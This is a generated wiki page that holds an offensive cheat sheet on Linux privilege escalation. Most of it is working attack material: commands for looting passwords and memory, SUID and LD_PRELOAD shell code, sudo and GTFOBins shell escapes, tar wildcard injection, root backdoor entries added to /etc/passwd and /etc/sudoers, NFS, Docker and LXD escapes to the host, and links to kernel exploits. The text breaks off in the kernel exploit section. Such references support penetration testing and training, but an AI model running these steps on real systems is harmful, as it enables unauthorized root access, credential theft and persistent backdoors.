---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Linux - Privilege Escalation

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-escalation-linux-privilege-escalation` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/escalation/linux-privilege-escalation.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Linux - Privilege Escalation](../../topics/redteam/linux-privilege-escalation.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-escalation-linux-privilege-escalation |
| name | Linux - Privilege Escalation |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/escalation/linux-privilege-escalation.md |

## Preserved Source Material

````yaml
_body: "# Linux - Privilege Escalation\n\n## Summary\n\n* [Tools](#tools)\n* [Checklist](#checklists)\n* [Looting for passwords](#looting-for-passwords)\n\
  \    * [Files containing passwords](#files-containing-passwords)\n    * [Old passwords in /etc/security/opasswd](#old-passwords-in-etcsecurityopasswd)\n\
  \    * [Last edited files](#last-edited-files)\n    * [In memory passwords](#in-memory-passwords)\n    * [Find sensitive\
  \ files](#find-sensitive-files)\n* [SSH Key](#ssh-key)\n    * [Sensitive files](#sensitive-files)\n    * [SSH Key Predictable\
  \ PRNG (Authorized_Keys) Process](#ssh-key-predictable-prng-authorized_keys-process)\n* [Scheduled tasks](#scheduled-tasks)\n\
  \    * [Cron jobs](#cron-jobs)\n    * [Systemd timers](#systemd-timers)\n* [SUID](#suid)\n    * [Find SUID binaries](#find-suid-binaries)\n\
  \    * [Create a SUID binary](#create-a-suid-binary)\n* [Capabilities](#capabilities)\n    * [List capabilities of binaries](#list-capabilities-of-binaries)\n\
  \    * [Edit capabilities](#edit-capabilities)\n    * [Interesting capabilities](#interesting-capabilities)\n* [SUDO](#sudo)\n\
  \    * [NOPASSWD](#nopasswd)\n    * [LD_PRELOAD and NOPASSWD](#ld_preload-and-nopasswd)\n    * [Doas](#doas)\n    * [sudo_inject](#sudo_inject)\n\
  \    * [CVE-2019-14287](#cve-2019-14287)\n* [GTFOBins](#gtfobins)\n* [Wildcard](#wildcard)\n* [Writable files](#writable-files)\n\
  \    * [Writable /etc/passwd](#writable-etcpasswd)\n    * [Writable /etc/sudoers](#writable-etcsudoers)\n* [NFS Root Squashing](#nfs-root-squashing)\n\
  * [Shared Library](#shared-library)\n    * [ldconfig](#ldconfig)\n    * [RPATH](#rpath)\n* [Groups](#groups)\n    * [Docker](#docker)\n\
  \    * [LXC/LXD](#lxclxd)\n* [Hijack TMUX session](#hijack-tmux-session)\n* [Kernel Exploits](#kernel-exploits)\n    * [CVE-2022-0847\
  \ (DirtyPipe)](#cve-2022-0847-dirtypipe)\n    * [CVE-2016-5195 (DirtyCow)](#cve-2016-5195-dirtycow)\n    * [CVE-2010-3904\
  \ (RDS)](#cve-2010-3904-rds)\n    * [CVE-2010-4258 (Full Nelson)](#cve-2010-4258-full-nelson)\n    * [CVE-2012-0056 (Mempodipper)](#cve-2012-0056-mempodipper)\n\
  \n## Tools\n\nThere are many scripts that you can execute on a linux machine which automatically enumerate sytem information,\
  \ processes, and files to locate privilege escalation vectors.\nHere are a few:\n\n* [LinPEAS - Linux Privilege Escalation\
  \ Awesome Script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)\n\n    ```powershell\n    wget \"https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\"\
  \ -O linpeas.sh\n    curl \"https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\" -o linpeas.sh\n\
  \    ./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.\n    ./linpeas.sh -s #superfast\
  \ & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.\n    ./linpeas.sh\
  \ -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users\n    ```\n\n* [LinuxSmartEnumeration\
  \ - Linux enumeration tools for pentesting and CTFs](https://github.com/diego-treitos/linux-smart-enumeration)\n\n    ```powershell\n\
  \    wget \"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\" -O lse.sh\n    curl\
  \ \"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\" -o lse.sh\n    ./lse.sh -l1\
  \ # shows interesting information that should help you to privesc\n    ./lse.sh -l2 # dump all the information it gathers\
  \ about the system\n    ```\n\n* [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)\n\
  \n    ```powershell\n    ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t\n    ```\n\n* [BeRoot - Privilege Escalation Project\
  \ - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)\n* [linuxprivchecker.py - a Linux Privilege Escalation\
  \ Check Script](https://github.com/sleventyeleven/linuxprivchecker)\n* [unix-privesc-check - Automatically exported from\
  \ code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)\n* [Privilege Escalation through\
  \ sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)\n\n## Checklists\n\n* Kernel and distribution release details\n\
  * System Information:\n    * Hostname\n    * Networking details:\n    * Current IP\n    * Default route details\n    * DNS\
  \ server information\n* User Information:\n    * Current user details\n    * Last logged on users\n    * Shows users logged\
  \ onto the host\n    * List all users including uid/gid information\n    * List root accounts\n    * Extracts password policies\
  \ and hash storage method information\n    * Checks umask value\n    * Checks if password hashes are stored in /etc/passwd\n\
  \    * Extract full details for 'default' uid's such as 0, 1000, 1001 etc\n    * Attempt to read restricted files i.e. /etc/shadow\n\
  \    * List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)\n    * Basic SSH checks\n\
  * Privileged access:\n    * Which users have recently used sudo\n    * Determine if /etc/sudoers is accessible\n    * Determine\
  \ if the current user has Sudo access without a password\n    * Are known 'good' breakout binaries available via Sudo (i.e.\
  \ nmap, vim etc.)\n    * Is root's home directory accessible\n    * List permissions for /home/\n* Environmental:\n    *\
  \ Display current $PATH\n    * Displays env information\n* Jobs/Tasks:\n    * List all cron jobs\n    * Locate all world-writable\
  \ cron jobs\n    * Locate cron jobs owned by other users of the system\n    * List the active and inactive systemd timers\n\
  * Services:\n    * List network connections (TCP & UDP)\n    * List running processes\n    * Lookup and list process binaries\
  \ and associated permissions\n    * List inetd.conf/xined.conf contents and associated binary file permissions\n    * List\
  \ init.d binary permissions\n* Version Information (of the following):\n    * Sudo\n    * MYSQL\n    * Postgres\n    * Apache\n\
  \        * Checks user config\n        * Shows enabled modules\n        * Checks for htpasswd files\n        * View www\
  \ directories\n* Default/Weak Credentials:\n    * Checks for default/weak Postgres accounts\n    * Checks for default/weak\
  \ MYSQL accounts\n* Searches:\n    * Locate all SUID/GUID files\n    * Locate all world-writable SUID/GUID files\n    *\
  \ Locate all SUID/GUID files owned by root\n    * Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)\n    * Locate\
  \ files with POSIX capabilities\n    * List all world-writable files\n    * Find/list all accessible *.plan files and display\
  \ contents\n    * Find/list all accessible *.rhosts files and display contents\n    * Show NFS server details\n    * Locate\
  \ *.conf and*.log files containing keyword supplied at script runtime\n    * List all *.conf files located in /etc\n   \
  \ * Locate mail\n* Platform/software specific tests:\n    * Checks to determine if we're in a Docker container\n    * Checks\
  \ to see if the host has Docker installed\n    * Checks to determine if we're in an LXC container\n\n## Looting for passwords\n\
  \n### Files containing passwords\n\n```powershell\ngrep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2> /dev/null\n\
  find . -type f -exec grep -i -I \"PASSWORD\" {} /dev/null \\;\n```\n\n### Old passwords in /etc/security/opasswd\n\nThe\
  \ `/etc/security/opasswd` file is used also by pam_cracklib to keep the history of old passwords so that the user will not\
  \ reuse them.\n\n:warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password\
  \ hashes\n\n### Last edited files\n\nFiles that were edited in the last 10 minutes\n\n```powershell\nfind / -mmin -10 2>/dev/null\
  \ | grep -Ev \"^/proc\"\n```\n\n### In memory passwords\n\n**Memory**:\n\n```powershell\nstrings /dev/mem -n10 | grep -i\
  \ PASS\n```\n\n**Core Dump**:\n\n```ps1\n# Find PID\nps -eo pid,command\n\n# Core dump PID\ngcore <pid> -o dumpfile\n\n\
  # Search for passwords\nstrings -n 5 dumpfile | grep -i pass\n```\n\n### Find sensitive files\n\n```powershell\n$ locate\
  \ password | more           \n/boot/grub/i386-pc/password.mod\n/etc/pam.d/common-password\n/etc/pam.d/gdm-password\n/etc/pam.d/gdm-password.original\n\
  /lib/live/config/0031-root-password\n...\n```\n\n### Preseed\n\nA preseed.cfg file is used in Debian-based Linux distributions\
  \ to automate the installation process. It contains answers to the questions that the installer normally asks, allowing\
  \ for a fully unattended installation. This file can specify configurations such as partitioning schemes, package selections,\
  \ network settings, and user accounts.\n\n* Root password in clear text\n\n  ```ps1\n  d-i passwd/root-password password\
  \ root_password_123\n  d-i passwd/root-password-again password root_password_123\n  ```\n\n* Root password encrypted using\
  \ an MD5 hash\n\n  ```ps1\n  d-i passwd/root-password-crypted password $1$DhSfFtNS$v/Eb.KsQkTq8nKIX1.B8n.\n  ```\n\n* Normal\
  \ user's password in clear text\n\n  ```ps1\n  d-i passwd/user-password password my_password_123\n  d-i passwd/user-password-again\
  \ password my_password_123\n  ```\n\n* Normal user's password encrypted using an MD5 hash\n\n  ```ps1\n  d-i passwd/user-password-crypted\
  \ password $1$DgJMNO1/$BqfY2C5y00p0yhpApPmmJ1\n  ```\n\n## SSH Key\n\n### Sensitive files\n\n```ps1\nfind / -name authorized_keys\
  \ 2> /dev/null\nfind / -name id_rsa 2> /dev/null\n```\n\n### SSH Key Predictable PRNG (Authorized_Keys) Process\n\nThis\
  \ module describes how to attempt to use an obtained authorized_keys file on a host system.\n\nNeeded : SSH-DSS String from\
  \ authorized_keys file\n\n**Steps**\n\nGet the authorized_keys file. An example of this file would look like so:\n\n```ps1\n\
  ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... \n```\n\nSince this\
  \ is an ssh-dss key, we need to add that to our local copy of `/etc/ssh/ssh_config` and `/etc/ssh/sshd_config`:\n\n```ps1\n\
  echo \"PubkeyAcceptedKeyTypes=+ssh-dss\" >> /etc/ssh/ssh_config\necho \"PubkeyAcceptedKeyTypes=+ssh-dss\" >> /etc/ssh/sshd_config\n\
  /etc/init.d/ssh restart\n```\n\nGet [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh) and unpack the keys:\n\n\
  ```ps1\ngit clone https://github.com/g0tmi1k/debian-ssh\ncd debian-ssh\ntar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2\n\
  ```\n\nGrab the first 20 or 30 bytes from the key file shown above starting with the `\"AAAA...\"` portion and grep the\
  \ unpacked keys with it as:\n\n```ps1\ngrep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'\n\
  dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub\n```\n\nIF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub)\
  \ public file. To use the private key file to connect, drop the '.pub' extension and do:\n\n```ps1\nssh -vvv victim@target\
  \ -i 68b329da9893e34099c7d8ad5cb9c940-17934\n```\n\nAnd you should connect without requiring a password. If stuck, the `-vvv`\
  \ verbosity should provide enough details as to why.\n\n## Scheduled tasks\n\n### Cron jobs\n\nCheck if you have access\
  \ with write permission on these files.\nCheck inside the file, to find other paths with write permissions.\n\n```powershell\n\
  /etc/init.d\n/etc/cron*\n/etc/crontab\n/etc/cron.allow\n/etc/cron.d \n/etc/cron.deny\n/etc/cron.daily\n/etc/cron.hourly\n\
  /etc/cron.monthly\n/etc/cron.weekly\n/etc/sudoers\n/etc/exports\n/etc/anacrontab\n/var/spool/cron\n/var/spool/cron/crontabs/root\n\
  \ncrontab -l\nls -alh /var/spool/cron;\nls -al /etc/ | grep cron\nls -al /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow\n\
  cat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny*\n```\n\nYou can use [DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)\
  \ to detect a CRON job.\n\n```powershell\n# print both commands and file system events and scan procfs every 1000 ms (=1sec)\n\
  ./pspy64 -pf -i 1000 \n```\n\n## Systemd timers\n\n```powershell\nsystemctl list-timers --all\nNEXT                    \
  \      LEFT     LAST                          PASSED             UNIT                         ACTIVATES\nMon 2019-04-01\
  \ 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service\n\
  Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service\n\
  Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service\n\
  \n3 timers listed.\n```\n\n## SUID\n\nSUID/Setuid stands for \"set user ID upon execution\", it is enabled by default in\
  \ every Linux distributions. If a file with this bit is run, the uid will be changed by the owner one. If the file owner\
  \ is `root`, the uid will be changed to `root` even if it was executed from user `bob`. SUID bit is represented by an `s`.\n\
  \n```powershell\n╭─swissky@lab ~  \n╰─$ ls /usr/bin/sudo -alh                  \n-rwsr-xr-x 1 root root 138K 23 nov.  16:04\
  \ /usr/bin/sudo\n```\n\n### Find SUID binaries\n\n```bash\nfind / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;\n\
  find / -uid 0 -perm -4000 -type f 2>/dev/null\n```\n\n### Create a SUID binary\n\n| Function   | Description  |\n|------------|---|\n\
  | setreuid() | sets real and effective user IDs of the calling process  |\n| setuid()   | sets the effective user ID of\
  \ the calling process        |\n| setgid()   | sets the effective group ID of the calling process       |\n\n```bash\nprint\
  \ 'int main(void){\\nsetresuid(0, 0, 0);\\nsystem(\"/bin/sh\");\\n}' > /tmp/suid.c   \ngcc -o /tmp/suid /tmp/suid.c  \n\
  sudo chmod +x /tmp/suid # execute right\nsudo chmod +s /tmp/suid # setuid bit\n```\n\n## Capabilities\n\n### List capabilities\
  \ of binaries\n\n```powershell\n╭─swissky@lab ~  \n╰─$ /usr/bin/getcap -r  /usr/bin\n/usr/bin/fping                = cap_net_raw+ep\n\
  /usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip\n/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep\n\
  /usr/bin/rlogin               = cap_net_bind_service+ep\n/usr/bin/ping                 = cap_net_raw+ep\n/usr/bin/rsh  \
  \                = cap_net_bind_service+ep\n/usr/bin/rcp                  = cap_net_bind_service+ep\n```\n\n### Edit capabilities\n\
  \n```powershell\n/usr/bin/setcap -r /bin/ping            # remove\n/usr/bin/setcap cap_net_raw+p /bin/ping # add\n```\n\n\
  ### Interesting capabilities\n\nHaving the capability =ep means the binary has all the capabilities.\n\n```powershell\n\
  $ getcap openssl /usr/bin/openssl \nopenssl=ep\n```\n\nAlternatively the following capabilities can be used in order to\
  \ upgrade your current privileges.\n\n```powershell\ncap_dac_read_search # read anything\ncap_setuid+ep # setuid\n```\n\n\
  Example of privilege escalation with `cap_setuid+ep`\n\n```powershell\n$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7\n\
  \n$ python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\nsh-5.0# id\nuid=0(root) gid=1000(swissky)\n```\n\n|\
  \ Capabilities name  | Description |\n|---|---|\n| CAP_AUDIT_CONTROL  | Allow to enable/disable kernel auditing |\n| CAP_AUDIT_WRITE\
  \  | Helps to write records to kernel auditing log |\n| CAP_BLOCK_SUSPEND  | This feature can block system suspends   |\n\
  | CAP_CHOWN  | Allow user to make arbitrary change to files UIDs and GIDs |\n| CAP_DAC_OVERRIDE  | This helps to bypass\
  \ file read, write and execute permission checks |\n| CAP_DAC_READ_SEARCH  | This only bypasses file and directory read/execute\
  \ permission checks  |\n| CAP_FOWNER  | This enables bypass of permission checks on operations that normally require the\
  \ filesystem UID of the process to match the UID of the file  |\n| CAP_KILL  | Allow the sending of signals to processes\
  \ belonging to others  |\n| CAP_SETGID  | Allow changing of the GID  |\n| CAP_SETUID  | Allow changing of the UID  |\n|\
  \ CAP_SETPCAP  | Helps to transferring and removal of current set to any PID |\n| CAP_IPC_LOCK  | This helps to lock memory\
  \  |\n| CAP_MAC_ADMIN  | Allow MAC configuration or state changes  |\n| CAP_NET_RAW  | Use RAW and PACKET sockets |\n| CAP_NET_BIND_SERVICE\
  \  | SERVICE Bind a socket to internet domain privileged ports  |\n\n## SUDO\n\nTool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO_KILLER)\n\
  \n### NOPASSWD\n\nSudo configuration might allow a user to execute some command with another user's privileges without knowing\
  \ the password.\n\n```bash\n$ sudo -l\n\nUser demo may run the following commands on crashlab:\n    (root) NOPASSWD: /usr/bin/vim\n\
  ```\n\nIn this example the user `demo` can run `vim` as `root`, it is now trivial to get a shell by adding an ssh key into\
  \ the root directory or by calling `sh`.\n\n```bash\nsudo vim -c '!sh'\nsudo -u root vim -c '!sh'\n```\n\n### LD_PRELOAD\
  \ and NOPASSWD\n\nIf `LD_PRELOAD` is explicitly defined in the sudoers file\n\n```powershell\nDefaults        env_keep +=\
  \ LD_PRELOAD\n```\n\nCompile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c\
  \ -nostartfiles`\n\n```c\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid _init()\
  \ {\n unsetenv(\"LD_PRELOAD\");\n setgid(0);\n setuid(0);\n system(\"/bin/sh\");\n}\n```\n\nExecute any binary with the\
  \ LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so\
  \ find`\n\n### Doas\n\nThere are some alternatives to the `sudo` binary such as `doas` for OpenBSD, remember to check its\
  \ configuration at `/etc/doas.conf`\n\n```bash\npermit nopass demo as root cmd vim\n```\n\n### sudo_inject\n\nUsing [https://github.com/nongiach/sudo_inject](https://github.com/nongiach/sudo_inject)\n\
  \n```powershell\n$ sudo whatever\n[sudo] password for user:    \n# Press <ctrl>+c since you don't have the password. \n\
  # This creates an invalid sudo tokens.\n$ sh exploit.sh\n.... wait 1 seconds\n$ sudo -i # no password required :)\n# id\n\
  uid=0(root) gid=0(root) groups=0(root)\n```\n\nSlides of the presentation : [https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)\n\
  \n### CVE-2019-14287\n\n```powershell\n# Exploitable when a user have the following permissions (sudo -l)\n(ALL, !root)\
  \ ALL\n\n# If you have a full TTY, you can exploit it like this\nsudo -u#-1 /bin/bash\nsudo -u#4294967295 id\n```\n\n##\
  \ GTFOBins\n\n[GTFOBins](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker\
  \ to bypass local security restrictions.\n\nThe project collects legitimate functions of Unix binaries that can be abused\
  \ to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells,\
  \ and facilitate the other post-exploitation tasks.\n\n> gdb -nx -ex '!sh' -ex quit\n> sudo mysql -e '\\! /bin/sh'\n> strace\
  \ -o /dev/null /bin/sh\n> sudo awk 'BEGIN {system(\"/bin/sh\")}'\n\n## Wildcard\n\nBy using tar with –checkpoint-action\
  \ options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be\
  \ used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite\
  \ easy, and that's where the wildcard comes in handy.\n\n```powershell\n# create file for exploitation\ntouch -- \"--checkpoint=1\"\
  \ntouch -- \"--checkpoint-action=exec=sh shell.sh\"\necho \"#\\!/bin/bash\\ncat /etc/passwd > /tmp/flag\\nchmod 777 /tmp/flag\"\
  \ > shell.sh\n\n# vulnerable script\ntar cf archive.tar *\n```\n\nTool: [wildpwn](https://github.com/localh0t/wildpwn)\n\
  \n## Writable files\n\nList world writable files on the system.\n\n```powershell\nfind / -writable ! -user `whoami` -type\
  \ f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \\; 2>/dev/null\nfind / -perm -2 -type f 2>/dev/null\nfind /\
  \ ! -path \"*/proc/*\" -perm -2 -type f -print 2>/dev/null\n```\n\n### Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)\n\
  \n/etc/sysconfig/network-scripts/ifcfg-1337 for example\n\n```powershell\nNAME=Network /bin/id  &lt;= Note the blank space\n\
  ONBOOT=yes\nDEVICE=eth0\n\nEXEC :\n./etc/sysconfig/network-scripts/ifcfg-1337\n```\n\nsrc : [https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)\n\
  \n### Writable /etc/passwd\n\nFirst generate a password with one of the following commands.\n\n```powershell\nopenssl passwd\
  \ -1 -salt hacker hacker\nmkpasswd -m SHA-512 hacker\npython2 -c 'import crypt; print crypt.crypt(\"hacker\", \"$6$salt\"\
  )'\n```\n\nThen add the user `hacker` and add the generated password.\n\n```powershell\nhacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash\n\
  ```\n\nE.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`\n\nYou can now use the `su` command with\
  \ `hacker:hacker`\n\nAlternatively you can use the following lines to add a dummy user without a password.\nWARNING: you\
  \ might degrade the current security of the machine.\n\n```powershell\necho 'dummy::0:0::/root:/bin/bash' >>/etc/passwd\n\
  su - dummy\n```\n\nNOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow`\
  \ is renamed to `/etc/spwd.db`.\n\n### Writable /etc/sudoers\n\n```powershell\necho \"username ALL=(ALL:ALL) ALL\">>/etc/sudoers\n\
  \n# use SUDO without password\necho \"username ALL=(ALL) NOPASSWD: ALL\" >>/etc/sudoers\necho \"username ALL=NOPASSWD: /bin/bash\"\
  \ >>/etc/sudoers\n```\n\n## NFS Root Squashing\n\nWhen **no_root_squash** appears in `/etc/exports`, the folder is shareable\
  \ and a remote user can mount it.\n\n```powershell\n# remote check the name of the folder\nshowmount -e 10.10.10.10\n\n\
  # create dir\nmkdir /tmp/nfsdir  \n\n# mount directory \nmount -t nfs 10.10.10.10:/shared /tmp/nfsdir    \ncd /tmp/nfsdir\n\
  \n# copy wanted shell \ncp /bin/bash .  \n\n# set suid permission\nchmod +s bash  \n```\n\n## Shared Library\n\n### ldconfig\n\
  \nIdentify shared libraries with `ldd`\n\n```powershell\n$ ldd /opt/binary\n    linux-vdso.so.1 (0x00007ffe961cd000)\n \
  \   vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)\n    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2\
  \ (0x00007fa55e6c8000)        \n```\n\nCreate a library in `/tmp` and activate the path.\n\n```powershell\ngcc –Wall –fPIC\
  \ –shared –o vulnlib.so /tmp/vulnlib.c\necho \"/tmp/\" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so\n\
  /opt/binary\n```\n\n### RPATH\n\n```powershell\nlevel15@nebula:/home/flag15$ readelf -d flag15 | egrep \"NEEDED|RPATH\"\n\
  \ 0x00000001 (NEEDED)                     Shared library: [libc.so.6]\n 0x0000000f (RPATH)                      Library\
  \ rpath: [/var/tmp/flag15]\n\nlevel15@nebula:/home/flag15$ ldd ./flag15 \n linux-gate.so.1 =>  (0x0068c000)\n libc.so.6\
  \ => /lib/i386-linux-gnu/libc.so.6 (0x00110000)\n /lib/ld-linux.so.2 (0x005bb000)\n```\n\nBy copying the lib into `/var/tmp/flag15/`\
  \ it will be used by the program in this place as specified in the `RPATH` variable.\n\n```powershell\nlevel15@nebula:/home/flag15$\
  \ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/\n\nlevel15@nebula:/home/flag15$ ldd ./flag15 \n linux-gate.so.1 => \
  \ (0x005b0000)\n libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)\n /lib/ld-linux.so.2 (0x00737000)\n```\n\nThen create\
  \ an evil library in `/var/tmp` with `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o\
  \ libc.so.6`\n\n```powershell\n#include<stdlib.h>\n#define SHELL \"/bin/sh\"\n\nint __libc_start_main(int (*main) (int,\
  \ char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void\
  \ (* stack_end))\n{\n char *file = SHELL;\n char *argv[] = {SHELL,0};\n setresuid(geteuid(),geteuid(), geteuid());\n execve(file,argv,0);\n\
  }\n```\n\n## Groups\n\n### Docker\n\nMount the filesystem in a bash container, allowing you to edit the `/etc/passwd` as\
  \ root, then add a backdoor account `toor:password`.\n\n```bash\n$> docker run -it --rm -v $PWD:/mnt bash\n$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh'\
  \ >> /mnt/etc/passwd\n```\n\nAlmost similar but you will also see all processes running on the host and be connected to\
  \ the same NICs.\n\n```powershell\ndocker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash\n```\n\n\
  Or use the following docker image from [chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/) to spawn\
  \ a root shell\n\n```powershell\n$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease\nlatest: Pulling from chrisfosterelli/rootplease\n\
  2de59b831a23: Pull complete \n354c3661655e: Pull complete \n91930878a2d7: Pull complete \na3ed95caeb02: Pull complete \n\
  489b110c54dc: Pull complete \nDigest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0\nStatus: Downloaded\
  \ newer image for chrisfosterelli/rootplease:latest\n\nYou should now have a root shell on the host OS\nPress Ctrl-D to\
  \ exit the docker instance / shell\n\nsh-5.0# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\nMore docker privilege escalation\
  \ using the Docker Socket.\n\n```powershell\nsudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu\
  \ chroot /host /bin/bash\nsudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian\
  \ nsenter -t 1 -m -u -n -i sh\n```\n\n### LXC/LXD\n\nThe privesc requires to run a container with elevated privileges and\
  \ mount the host filesystem inside.\n\n```powershell\n╭─swissky@lab ~  \n╰─$ id\nuid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)\n\
  ```\n\nBuild an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as\
  \ root with the host filesystem.\n\n```powershell\n# build a simple alpine image\ngit clone https://github.com/saghul/lxd-alpine-builder\n\
  ./build-alpine -a i686\n\n# import the image\nlxc image import ./alpine.tar.gz --alias myimage\n\n# run the image\nlxc init\
  \ myimage mycontainer -c security.privileged=true\n\n# mount the /root into the image\nlxc config device add mycontainer\
  \ mydevice disk source=/ path=/mnt/root recursive=true\n\n# interact with the container\nlxc start mycontainer\nlxc exec\
  \ mycontainer /bin/sh\n```\n\nAlternatively <https://github.com/initstring/lxd_root>\n\n## Hijack TMUX session\n\nRequire\
  \ a read access to the tmux socket : `/tmp/tmux-1000/default`.\n\n```powershell\nexport TMUX=/tmp/tmux-1000/default,1234,0\
  \ \ntmux ls\n```\n\n## Kernel Exploits\n\nPrecompiled exploits can be found inside these repositories, run them at your\
  \ own risk !\n\n* [bin-sploits - @offensive-security](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)\n\
  * [kernel-exploits - @lucyoa](https://github.com/lucyoa/kernel-exploits/)\n\nThe following exploits are known to work well,\
  \ search for more exploits with `searchsploit -w linux kernel centos`.\n\nAnother way to find a kernel exploit is to get\
  \ the specific kernel version and linux distro of the machine by doing `uname -a`\nCopy the kernel version and distribution,\
  \ and search for it in google or in <https://www.exploit-db.com/>.\n\n### CVE-2022-0847 (DirtyPipe)\n\nLinux Privilege Escalation\
  \ - Linux Kernel 5.8 < 5.16.11\n\n* [Lance Biggerstaff/2022-0847](https://www.exploit-db.com/exploits/50808)\n\n### CVE-2016-5195\
  \ (DirtyCow)\n\nLinux Privilege Escalation - Linux Kernel <= 3.19.0-73.8\n\n```powershell\n# make dirtycow stable\necho\
  \ 0 > /proc/sys/vm/dirty_writeback_centisecs\ng++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil\nhttps://github.com/dirtycow/dirtycow.github.io/wiki/PoCs\n\
  https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c\n```\n\n### CVE-2010-3904 (RDS)\n\nLinux RDS Exploit\
  \ - Linux Kernel <= 2.6.36-rc8\n\n```powershell\nhttps://www.exploit-db.com/exploits/15285/\n```\n\n### CVE-2010-4258 (Full\
  \ Nelson)\n\nLinux Kernel 2.6.37 (RedHat / Ubuntu 10.04)\n\n```powershell\nhttps://www.exploit-db.com/exploits/15704/\n\
